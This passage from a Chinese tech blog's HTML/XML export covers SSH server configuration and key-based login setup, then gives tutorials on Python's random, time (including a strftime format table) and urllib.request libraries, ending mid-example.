steven	#  只允许 steven 用户登录</span><br><span class="line">DenyUsers steven	#  不允许登录用户 steven</span><br><span class="line"></span><br><span class="line">#  验证</span><br><span class="line">PasswordAuthentication yes	#  启用密码验证（如配置密钥登录，则需关闭此项）</span><br><span class="line">PubkeyAuthentication yes		#  启用密匙验证</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br><span class="line">AuthorizedKeysFile      .ssh&#x2F;authorized_keys		#  指定公钥数据库文件（用于密钥登陆）</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="四、常用命令"><a href="#四、常用命令" class="headerlink" title="四、常用命令"></a>四、常用命令</h2><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><p>ssh 是 openssh 套件中的客户端连接工具</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ssh 常用参数</span><br><span class="line">-1	#  强制使用 ssh 协议版本1</span><br><span class="line">-2	#  强制使用 ssh 协议版本2</span><br><span class="line">-4	#  强制使用 IPV4 地址</span><br><span class="line">-6	#  强制使用 IPV6 地址</span><br><span class="line">-A	#  开启认证代理连接转发功能</span><br><span class="line">-a	#  关闭认证代理连接转发功能</span><br><span class="line">-b	#  使用本机指定地址作为对应连接的源 IP 地址</span><br><span class="line">-C	#  请求压缩所有数据</span><br><span class="line">-F	#  指定 ssh 指令的配置文件</span><br><span class="line">-f	#  后台执行 ssh 指令</span><br><span class="line">-g	#  允许远程主机连接主机</span><br><span class="line">-i	#  指定身份文件</span><br><span class="line">-l	#  指定连接远程服务器登陆用户名</span><br><span class="line">-N	#  不执行远程指令</span><br><span class="line">-o	#  指定配置选项</span><br><span class="line">-p	#  指定远程服务器的端口</span><br><span class="line">-q	#  静默模式</span><br><span class="line">-X	#  开启 X11 转发功能</span><br><span class="line">-x	#  关闭 X11 转发功能</span><br><span class="line">-y	#  开启信任 X11 转发功能</span><br></pre></td></tr></table></figure>
<h3 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h3><p>ssh-keygen 命令用于为 ssh 生成、管理和转换认证密钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  ssh-keygene 常用参数</span><br><span class="line">-C	#  添加注释</span><br><span class="line">-b	#  指定密钥长度</span><br><span class="line">-e	#  读取openssh 的私钥或公钥文件</span><br><span class="line">-f	#  指定用来保存密钥的文件名</span><br><span class="line">-i	#  读取未加密的 ssh-v2 兼容的私钥&#x2F;公钥文件，然后在标准输出设备上显示 openssh 见阿荣的私钥&#x2F;公钥</span><br><span class="line">-l	#  显示公钥文件的指纹数据</span><br><span class="line">-N	#  提供一个新密码</span><br><span class="line">-P	#  提供一个旧密码</span><br><span class="line">-q	#  静默模式</span><br><span class="line">-t	#  指定要创建的密钥类型（RSA、DSA，默认为 RSA）</span><br></pre></td></tr></table></figure>
<h3 id="ssh-cocpy-id"><a href="#ssh-cocpy-id" class="headerlink" title="ssh-cocpy-id"></a>ssh-cocpy-id</h3><p>ssh-copy-id 命令用于把本地主机的公钥复制到远程主机的 /root/.ssh/authorized_keys 文件中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-cocpy-id 常用参数</span><br><span class="line">-i	#  指定公钥文件</span><br></pre></td></tr></table></figure>
<h3 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h3><p>加密的方式在本地的主机和远程主机之间复制文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  scp 常用参数</span><br><span class="line">-1	#  强制使用 ssh 协议版本1</span><br><span class="line">-2	#  强制使用 ssh 协议版本2</span><br><span class="line">-4	#  强制使用 IPV4 地址</span><br><span class="line">-6	#  强制使用 IPV6 地址</span><br><span class="line">-B	#  以批处理模式运行</span><br><span class="line">-C	#  使用压缩</span><br><span class="line">-F	#  指定 ssh 配置文件</span><br><span class="line">-i	#  identity_file 从指定文件中读取传输时使用的密钥文件</span><br><span class="line">-l	#  指定宽带限制</span><br><span class="line">-o	#  指定使用的 ssh 选项</span><br><span class="line">-P	#  指定远程主机的端口号</span><br><span class="line">-p	#  保留文件的最后修改时间，最后访问时间和权限模式</span><br><span class="line">-q	#  不显示复制进度</span><br><span class="line">-r	#  以递归方式复制</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="五、配置密钥登陆"><a href="#五、配置密钥登陆" class="headerlink" title="五、配置密钥登陆"></a>五、配置密钥登陆</h2><h3 id="1、修改配置文件"><a href="#1、修改配置文件" class="headerlink" title="1、修改配置文件"></a>1、修改配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  修改服务端配置文件 &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">PasswordAuthentication no	#  关闭密码验证</span><br><span class="line">PubkeyAuthentication yes	#  启用密钥验证</span><br><span class="line">RSAAuthentication yes		#  使用 RSA 算法进行安全验证</span><br></pre></td></tr></table></figure>
<h3 id="2、在客户端生成密钥"><a href="#2、在客户端生成密钥" class="headerlink" title="2、在客户端生成密钥"></a>2、在客户端生成密钥</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">    指定私钥保存的路径及文件名（如不指定则默认为 &#x2F;root&#x2F;.ssh&#x2F;id_rsa）</span><br><span class="line">    密钥密码，最少五个字符（用于密钥连接时候使用，如不输入则可免密登陆）</span><br><span class="line">    确认密码</span><br><span class="line">    确完后自动在密钥文件所在位置创建 .pub 的公钥文件</span><br><span class="line"></span><br><span class="line">#  文件简介</span><br><span class="line">id_rsa		#  私钥文件</span><br><span class="line">id_rsa.pub	#  公钥文件</span><br><span class="line">authorized_keys	#  服务端公钥文件</span><br><span class="line">known_hosts	#  确认过公钥指纹的可信服务器列表的文件</span><br><span class="line">config		#  指定不同域名使用哪个密钥的配置文件</span><br></pre></td></tr></table></figure>
<h3 id="3、上传公钥到服务端"><a href="#3、上传公钥到服务端" class="headerlink" title="3、上传公钥到服务端"></a>3、上传公钥到服务端</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i id_rsa.pub root@192.168.1.123	#  将公钥上传到服务器（会自动在服务器 &#x2F;root&#x2F;.ssh&#x2F; 目录下创建 authorized_keys 文件）</span><br><span class="line"></span><br><span class="line">#  如前一行报错则可用 scp 命令拷贝</span><br><span class="line">#  将 .11 主机上的 id_rsa.pub 拷贝到指定目录并更名为 authorized_keys（服务端输入）</span><br><span class="line">scp -P 2222 root@10.1.82.11:&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line">#  或</span><br><span class="line">#  将本地主机上的 id_rsa.pub 文件拷贝到 .11 主机上并更名为 authorized_keys（客户端输入）</span><br><span class="line">scp -P 2222 &#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub root@10.1.82.12:&#x2F;root&#x2F;.ssh&#x2F;authorized_keys </span><br></pre></td></tr></table></figure>
<h3 id="4、连接"><a href="#4、连接" class="headerlink" title="4、连接"></a>4、连接</h3><p>如设置了公钥密码则需输入公钥密码，如没设置公钥密码则可免密登陆</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -p 2222 root@192.168.1.123</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络应用竞赛</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>random 库</title>
    <url>/2021/02/09/Python/%E5%BA%93/random%E5%BA%93/random/</url>
    <content><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p>该库用来生成伪随机数<a href="%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%EF%BC%9A%E5%B9%B6%E4%B8%8D%E6%98%AF%E7%9C%9F%E6%AD%A3%E7%9A%84%E9%9A%8F%E6%9C%BA%EF%BC%8C%E4%BD%86%E5%85%B7%E6%9C%89%E7%B1%BB%E4%BC%BC%E4%BA%8E%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9A%84%E7%BB%9F%E8%AE%A1%E7%89%B9%E5%BE%81%EF%BC%8C%E5%A6%82%E5%9D%87%E5%8C%80%E6%80%A7%E3%80%81%E7%8B%AC%E7%AB%8B%E6%80%A7%E7%AD%89%E3%80%82">^1</a></p>
<h2 id="二、常用函数："><a href="#二、常用函数：" class="headerlink" title="二、常用函数："></a>二、常用函数：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">random.randint(1, 10)</span><br></pre></td></tr></table></figure>
<p>&emsp;// 返回一个 1-10 的随机数整数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">randrange(start, stop, step)</span><br></pre></td></tr></table></figure>
<p>&emsp;// 返回一个随机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">random()</span><br></pre></td></tr></table></figure>
<p>&emsp;// 返回（0.0，1.0）范围内的下一随机浮点数（不接受参数）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uniform(1, 10)</span><br></pre></td></tr></table></figure>
<p>&emsp;// 返回一个 1-10 的随机浮点数</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>time 库</title>
    <url>/2021/02/09/Python/%E5%BA%93/time%E5%BA%93/time%20%E5%BA%93/</url>
    <content><![CDATA[<h2 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h2><p><strong>时间戳：</strong></p>
<ul>
<li>时间戳是指 1970 年 01 月 01 日 00 时 00 分 00 秒起至现在的总毫秒数。</li>
<li>1970年之前的日期就无法以此表示。太遥远的日期也不行， UNIX 和 Windows 只支持到 2038 年。</li>
</ul>
<p><strong>为什么会生成13位的时间戳，13位的时间戳和10时间戳分别是怎么来的？</strong></p>
<ul>
<li>java的date默认精度是毫秒，也就是说生成的时间戳就是13位的，而像 c++ 或者 Python、php 生成的时间戳默认就是 10 位的，因为其精度是秒。</li>
</ul>
<p><strong>13位时间戳如何转换成10位时间戳？</strong></p>
<ul>
<li>第一种：将13位的时间戳最后三位数字截取</li>
<li>第二种：将13位时间戳除以1000取整。</li>
</ul>
<p><strong>Unix纪元时间：</strong></p>
<ul>
<li>很多编程语言起源于UNIX系统，而UNIX系统认为1970年1月1日0时0分0秒是时间纪元，所以常说的UNIX时间戳是以1970年1月1日0时0分0秒为计时起点时间的。</li>
</ul>
<p><strong>UTC（协调世界时）：</strong></p>
<ul>
<li>世界统一时间、世界标准时间、国际协调时间。简称 UTC，在中国为 UTC+8（小时）</li>
</ul>
<p><strong>DST（夏令时）：</strong></p>
<ul>
<li>时间使用策略。人为的将时间调快一小时，可以使人早睡早起，减少照明量，以充分利用光照资源从而节约照明用电。</li>
</ul>
<p><strong>时间元组：</strong></p>
<ul>
<li>以元组的方式表示时间，如：(2020, 1, 2, 3, 40, 50, 6, 7, 0)</li>
</ul>
<p><strong>时间元组对照表：</strong><br>索引值 | 属性 | 值<br>:-:|:-: |:-:<br>0 | 年 | 4位数（2020）<br>1 | 月 | 1<del>12<br>2 | 日 | 1</del>31<br>3 | 时 | 0<del>23<br>4 | 分 | 0</del>59<br>5 | 秒 | 0<del>61（闰秒 ^[1]）<br>6 | 星期几 | 0</del>6（0表示星期一）<br>7 | 一年中的第几天 | 1~366<br>8 | 是否为夏令时 | 0，1，-1（-1代表夏令时）</p>
<hr>
<h2 id="二、常用函数"><a href="#二、常用函数" class="headerlink" title="二、常用函数"></a>二、常用函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test &#x3D; (2020, 2, 20, 2, 20, 20, 0, 0, 0)</span><br><span class="line">time.asctime(test)</span><br></pre></td></tr></table></figure>
<p>&emsp;// 接受时间元组，并以可读的形式返回“Thu Feb 20 02:20:20 2020“（2020年2月20日 星期四 2时20分20秒）的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.ctime()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  获取本地时间，并以可读的形式返回（“Thu Feb 20 02:20:20 2020“）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test &#x3D; (2020, 2, 20, 2, 20, 20, 0, 0, 0)</span><br><span class="line">time.mktime(test)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  接受时间元组并返回时间戳（1970纪元后经过的浮点秒数）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.localtime()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  返回本地的时间（UTC+8）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.localtime(0)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  返回到Unix纪元时间向后偏移0秒的时间，由于当前属于东八区所以+8小时（1970/1/1 8:0:0 星期四 一年中的第一天）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.gmtime()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  返回本地的时间（UTC时间）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.gmtime(0)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  返回Unix纪元时间向后偏移0秒的时间（1970/1/1 0:0:0 星期四 一年中的第一天）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test &#x3D; (2020, 2, 20, 2, 20, 20, 0, 0, 0)</span><br><span class="line">time.mktime(test)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  获取 test 时间元组的时间戳</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.time()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  返回当前时间的时间戳</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test &#x3D; (2020, 2, 20, 2, 20, 20, 0, 0, 0)</span><br><span class="line">time.strftime(&quot;%Y-%m-%d  %H:%M:%S  %A&quot;, test)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  格式化时间字符串</p>
<body link="#0563C1" vlink="#954F72">

<table border="0" cellpadding="0" cellspacing="0" width="529" style="border-collapse:
 collapse;table-layout:fixed;width:397pt">
 <colgroup><col width="33" style="mso-width-source:userset;mso-width-alt:1166;width:25pt">
 <col width="54" style="mso-width-source:userset;mso-width-alt:1934;width:41pt">
 <col width="442" style="mso-width-source:userset;mso-width-alt:15701;width:331pt">
 </colgroup><tbody><tr height="18" style="height:13.8pt">
  <td height="18" class="xl83" width="33" style="height:13.8pt;width:25pt">　</td>
  <td class="xl83" width="54" style="border-left:none;width:41pt">格式</td>
  <td class="xl83" width="442" style="border-left:none;width:331pt">说明</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td rowspan="3" height="123" class="xl65" style="height:93.15pt;border-top:none">年</td>
  <td class="xl67" width="54" style="border-top:none;border-left:none;width:41pt">%Y</td>
  <td class="xl69" width="442" style="border-top:none;border-left:none;width:331pt">四个数字表示的年份（2020）</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl67" width="54" style="height:31.05pt;border-top:none;
  border-left:none;width:41pt">%y</td>
  <td class="xl69" width="442" style="border-top:none;border-left:none;width:331pt">两个数字表示的年份（20）</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl67" width="54" style="height:31.05pt;border-top:none;
  border-left:none;width:41pt">%j</td>
  <td class="xl69" width="442" style="border-top:none;border-left:none;width:331pt">一年中的第几天（001-366）</td>
 </tr>
 <tr height="22" style="mso-height-source:userset;height:16.2pt">
  <td colspan="3" height="22" class="xl84" style="height:16.2pt">　</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td rowspan="3" height="123" class="xl85" style="height:93.15pt">月</td>
  <td class="xl72" width="54" style="width:41pt">%m</td>
  <td class="xl73" width="442" style="border-left:none;width:331pt">月份（0, 12）</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl66" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%b</td>
  <td class="xl68" width="442" style="border-top:none;border-left:none;width:331pt">月份的英文单词缩写：如一月，则返回
  <font class="font7"><span style="mso-spacerun:yes">&nbsp;</span>' </font><font class="font8">Jan</font><font class="font7"> '</font></td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl74" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%B</td>
  <td class="xl75" width="442" style="border-top:none;border-left:none;width:331pt">月份的英文单词全拼：如一月，则返回
  <font class="font7"><span style="mso-spacerun:yes">&nbsp;</span>' </font><font class="font8">January</font><font class="font7"> '</font></td>
 </tr>
 <tr height="18" style="height:13.8pt">
  <td colspan="3" height="18" class="xl84" style="height:13.8pt">　</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl78" style="height:31.05pt">日</td>
  <td class="xl79" width="54" style="width:41pt">%d</td>
  <td class="xl80" width="442" style="border-left:none;width:331pt">当前月的第几天（01-31）</td>
 </tr>
 <tr height="21" style="mso-height-source:userset;height:15.6pt">
  <td colspan="3" height="21" class="xl84" style="height:15.6pt">　</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td rowspan="3" height="123" class="xl85" style="height:93.15pt">时</td>
  <td class="xl76" width="54" style="width:41pt">%H</td>
  <td class="xl77" width="442" style="border-left:none;width:331pt">以24小时制表示当前小时</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%I</td>
  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">以12小时制表示当前小时</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%p</td>
  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">返回上午（AM）或者下午（PM）</td>
 </tr>
 <tr height="19" style="height:14.4pt">
  <td colspan="3" height="19" class="xl84" style="height:14.4pt">　</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl65" style="height:31.05pt;border-top:none">分</td>
  <td class="xl71" width="54" style="width:41pt">%M</td>
  <td class="xl70" width="442" style="border-left:none;width:331pt">返回分钟数（0，59）</td>
 </tr>
 <tr height="19" style="height:14.4pt">
  <td colspan="3" height="19" class="xl84" style="height:14.4pt">　</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl65" style="height:31.05pt;border-top:none">秒</td>
  <td class="xl71" width="54" style="width:41pt">%S</td>
  <td class="xl70" width="442" style="border-left:none;width:331pt">返回秒数（0，61）</td>
 </tr>
 <tr height="19" style="height:14.4pt">
  <td colspan="3" height="19" class="xl84" style="height:14.4pt">　</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td rowspan="5" height="205" class="xl65" style="height:155.25pt;border-top:none">星期</td>
  <td class="xl71" width="54" style="width:41pt">%U</td>
  <td class="xl70" width="442" style="border-left:none;width:331pt">返回现在是当前年的第几周（周日为第一天）</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%W</td>
  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">返回现在是当前年的第几周（周一为第一天）</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%w</td>
  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">返回当前是星期几（0~6），6表示星期天</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%a</td>
  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">星期的英文单词缩写：如星期一，则返回<span style="mso-spacerun:yes">&nbsp; </span>' Mon '<span style="mso-spacerun:yes">&nbsp;</span></td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl81" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%A</td>
  <td class="xl82" width="442" style="border-top:none;border-left:none;width:331pt">星期的英文单词全拼：如星期一，则返回<span style="mso-spacerun:yes">&nbsp; </span>' Monday '<span style="mso-spacerun:yes">&nbsp;</span></td>
 </tr>
 <tr height="18" style="height:13.8pt">
  <td colspan="3" height="18" class="xl84" style="height:13.8pt">　</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td rowspan="5" height="205" class="xl85" style="height:155.25pt">其他</td>
  <td class="xl76" width="54" style="width:41pt">%c</td>
  <td class="xl77" width="442" style="border-left:none;width:331pt">返回本地相应的日期和时间如<span style="mso-spacerun:yes">&nbsp; </span>' Fri Feb 20 02:20:20 2020 '</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%x</td>
  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">日期的字符串表示<span style="mso-spacerun:yes">&nbsp; </span>' <font class="font7">02/20/20</font><font class="font8"> '<span style="mso-spacerun:yes">&nbsp;&nbsp;</span></font></td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%X</td>
  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">时间的字符串表示<span style="mso-spacerun:yes">&nbsp; </span>' <font class="font7">02:20:20</font><font class="font8"> '<span style="mso-spacerun:yes">&nbsp;&nbsp;</span></font></td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%z</td>
  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">用
  +HHMM<span style="mso-spacerun:yes">&nbsp; </span>或<span style="mso-spacerun:yes">&nbsp; </span>-HHMM<span style="mso-spacerun:yes">&nbsp; </span>表示距离格林威治（时间时）的时区偏移（ H 代表十进制的小时数，M
  代表十进制的分钟数）</td>
 </tr>
 <tr height="41" style="mso-height-source:userset;height:31.05pt">
  <td height="41" class="xl71" width="54" style="height:31.05pt;border-top:none;
  width:41pt">%Z</td>
  <td class="xl70" width="442" style="border-top:none;border-left:none;width:331pt">时区的名字（如果不存在，则返回空字符）</td>
 </tr>
 <!--[if supportMisalignedColumns]-->
 <tr height="0" style="display:none">
  <td width="33" style="width:25pt"></td>
  <td width="54" style="width:41pt"></td>
  <td width="442" style="width:331pt"></td>
 </tr>
 <!--[endif]-->
</tbody></table>
<tbdiv id="picinpicBtn"></tbdiv><tbdiv id="playerControlBtn"></tbdiv><tbdiv id="leftFullStackButton"></tbdiv><tbdiv id="rightFullStackButton"></tbdiv></body>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test1 &#x3D; &#39;2020&#x2F;2&#x2F;20 2:20:20&#39;</span><br><span class="line">format &#x3D; &quot;%Y&#x2F;%m&#x2F;%d  %H:%M:%S&quot;</span><br><span class="line">print (time.strptime(test1, format))</span><br></pre></td></tr></table></figure>
<p>&emsp;//  根据时间格式，从已经格式化的字符串中提取时间数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; time.localtime(time.time())</span><br><span class="line">time_format &#x3D; &quot;%Y&#x2F;%m&#x2F;%d %H:%M:%S&quot;</span><br><span class="line">b &#x3D; time.strftime(time_format, a)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  获取当前时间戳并转化为可读字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; time.localtime()</span><br><span class="line">b &#x3D; int(time.mktime(a))</span><br></pre></td></tr></table></figure>
<p>&emsp;//  获取当前时间并转化为时间戳</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.timezone</span><br></pre></td></tr></table></figure>
<p>&emsp;//  当地时区（未启动夏令时）距离格林威治（时间时）的偏移秒数（美洲 &gt;0 ；大部分欧洲、亚洲、非洲 &lt;=0）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.tzname</span><br></pre></td></tr></table></figure>
<p>&emsp;//  包含两个字符串的元组：</p>
<ul>
<li>第一个是当地非夏令时区的名称</li>
<li>第二个是当地的 DST（夏令时） 时区的名称</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.sleep(5)</span><br></pre></td></tr></table></figure>
<p>&emsp;//  程序暂停 5 秒后继续运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">time.perf_counter()</span><br></pre></td></tr></table></figure>
<p>&emsp;//  cpu计时器也是用于计算代码的执行时间</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>urllib.request 库</title>
    <url>/2021/02/09/Python/%E5%BA%93/urllib%E5%BA%93/urllib.request/</url>
    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>urllib.request 模块提供了访问 URL 的相关功能</p>
<h2 id="二、常用函数"><a href="#二、常用函数" class="headerlink" title="二、常用函数"></a>二、常用函数</h2><p><code>urllib.request.urlopen(&quot;http://httpbin.org&quot;, timeout=1)</code><br>&emsp; //  访问网页，并设置1秒的超时时间（urlopen 只能实现最基本的请求）</p>
<p><strong>读：</strong></p>
<ul>
<li><code>.read()</code>               &emsp; //  读取网页（二进制）</li>
<li><code>.decode(&#39;utf-8&#39;)</code>      &emsp; //  以 utf-8 解码网页</li>
<li><code>.geturl()</code>     &emsp; //  获取访问的 URL</li>
</ul>
<p><strong>信息：</strong></p>
<ul>
<li><code>.info()</code>       &emsp; //  获取网响应页的 Headers 信息</li>
<li><code>.headers</code>    &emsp; //  获取网页响应的 Headers 信息</li>
<li><code>.getheaders()</code>    &emsp; //  获取网页响应的 Headers 信息（以列表形式返回）</li>
<li><code>.getheader(name=&quot;Content-Type&quot;)</code>    &emsp; //  获取网页响应的 Headers 信息（查看指定的属性）</li>
<li><code>.version</code>    &emsp; //  查看 HTTP 使用的版本协议号</li>
</ul>
<p><strong>状态码：</strong></p>
<ul>
<li><code>.getcode()</code>    &emsp; //  获取当前访问的状态码</li>
<li><code>.status</code>        &emsp; //  获取当前访问的状态码</li>
<li><code>.reason</code>        &emsp; //  获取当前访问的状态码（如访问成功则返回 OK）</li>
</ul>
<p><code>urllib.request.Request(url=url, data=data, headers=header,  method=&quot;POST&quot;)</code></p>
<ul>
<li><code>.add_header</code>        &emsp; //  添加新的 Header（接受元组类型）</li>
</ul>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">url</td>
<td align="center">需请求的 url</td>
</tr>
<tr>
<td align="center">data</td>
<td align="center">必须为 bytes（字节流）类型，如为字典，可用 urllib.parse.urlencode()</td>
</tr>
<tr>
<td align="center">headers</td>
<td align="center">请求头</td>
</tr>
<tr>
<td align="center">origin_req_host</td>
<td align="center">指定请求方的 host 名称或 ip 地址</td>
</tr>
<tr>
<td align="center">unverifiable</td>
<td align="center">设置网页是否需要验证（默认为 Flase）</td>
</tr>
<tr>
<td align="center">method</td>
<td align="center">指定请求方法（如：GET、POST等）</td>
</tr>
</tbody></table>
<hr>
<h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><p>1、读取网页，并以 utf-8 格式解码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  读取网页，并以 utf-8 格式解码</span><br><span class="line">urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&quot;).read().decode(&#39;utf-8&#39;)</span><br></pre></td></tr></table></figure>
<p>2、获取访问的 URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  获取访问的 URL</span><br><span class="line">urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&quot;).geturl()</span><br></pre></td></tr></table></figure>
<p>3、获取 Headers 信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  获取 Headers 信息</span><br><span class="line">urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&quot;).info()</span><br></pre></td></tr></table></figure>
<p>4、获取访问的状态码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  获取访问的状态码</span><br><span class="line">urllib.request.urlopen(&quot;http:&#x2F;&#x2F;httpbin.org&quot;).getcode()</span><br></pre></td></tr></table></figure>
<p>5、指定 Headers 访问网页</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">#  指定访问的 URL</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get&quot;</span><br><span class="line"></span><br><span class="line">#  指定访问的 Headers</span><br><span class="line">header &#x3D; &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 99.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.83 Safari&#x2F;537.36&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#  使用指定的 Headers 访问网页</span><br><span class="line">test 